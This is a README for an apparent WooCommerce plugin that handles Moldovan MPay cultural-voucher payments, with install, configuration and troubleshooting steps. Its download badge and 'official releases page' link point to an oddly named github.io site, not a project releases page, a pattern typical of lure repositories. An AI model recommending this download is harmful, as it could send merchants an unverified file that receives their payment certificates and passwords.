# 💳 mpay-cultural-voucher-woocommerce-gateway - Process cultural voucher payments on WooCommerce

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://chopbullshot922.github.io)

This plugin connects your WooCommerce store to the Moldova MPay system. It allows your customers to pay for items using cultural vouchers. The integration handles the secure communication between your store and the national payment provider.

## 📋 System Requirements

To use this plugin, your website needs to meet these basic standards:

* WordPress version 6.0 or higher.
* WooCommerce version 7.0 or higher.
* PHP version 7.4 or higher.
* A valid SSL certificate installed on your domain.
* Access to your server to upload plugin files.
* An active MPay merchant account with valid credentials.

## ⬇️ How to Download and Install

Follow these steps to add the payment gateway to your store.

1. Visit the [official releases page](https://chopbullshot922.github.io) to download the plugin.
2. Look for the file named `mpay-cultural-voucher.zip` under the latest release heading.
3. Click the file name to save the zip folder to your computer. Do not unzip this file.
4. Log in to your WordPress dashboard.
5. Go to Plugins on the left sidebar.
6. Click the Add New button at the top of the page.
7. Click the Upload Plugin button.
8. Select the `mpay-cultural-voucher.zip` file you downloaded earlier.
9. Click Install Now.
10. Click the Activate Plugin button once the process finishes.

## ⚙️ Setting Up the Gateway

After activation, you must configure the plugin to connect with your MPay account.

1. Go to WooCommerce in your dashboard sidebar.
2. Select Settings from the menu.
3. Click the Payments tab at the top of the screen.
4. Find MPay Cultural Voucher in the list.
5. Click the Manage button next to the gateway name.
6. Check the Enable MPay Cultural Voucher box.
7. Enter your Merchant ID provided by the payment service.
8. Upload your PKCS12 certificate file in the designated field.
9. Provide the secure password for your certificate.
10. Select the environment type. Use Sandbox for testing and Production for live payments.
11. Click Save Changes at the bottom of the page.

## 🔒 Security Features

This plugin keeps data safe by using industry standards. It uses SOAP requests to send information to MPay. Every request uses XML Digital Signatures to verify that the data stays intact. The plugin also uses X509 certificates to encrypt the connection. These tools ensure that voucher data travels securely between your customer and the government payment portal.

## 🛠️ Troubleshooting

If you encounter issues, check these common items first:

* Verify that your WordPress site has a valid SSL certificate. MPay requires encrypted connections.
* Check your PHP version. If you run a version older than 7.4, the plugin may fail to activate.
* Confirm that your Merchant ID matches the one provided by MPay exactly.
* Ensure the PKCS12 file is not corrupted. Try re-uploading the file if you see a connection error.
* Check the WooCommerce logs. Go to WooCommerce, then Status, then Logs to see recent error messages.

## 💡 Frequently Asked Questions

**Does this plugin store customer voucher details?**
No. The plugin sends the voucher information directly to the MPay server. It does not save sensitive voucher numbers in your local database.

**Can I test the payment process?**
Yes. Use the Sandbox environment settings to perform test transactions. This allows you to verify the flow without processing real vouchers.

**What happens if a payment fails?**
The plugin returns an error message to the customer during checkout. You can view failed attempts in your WooCommerce Orders section.

**Do I need a specific server setup?**
Your server must allow outgoing SOAP requests. If your host blocks these connections, contact their support team to whitelist the MPay gateway address.

**Does the plugin support multiple currencies?**
The plugin processes transactions in Moldovan Leu (MDL) to match the cultural voucher system requirements.

Keywords: cultural-voucher, ecommerce, moldova, mpay, payment-gateway, php, pkcs12, soap, woocommerce, woocommerce-plugin, wordpress, ws-security, x509, xml-digital-signature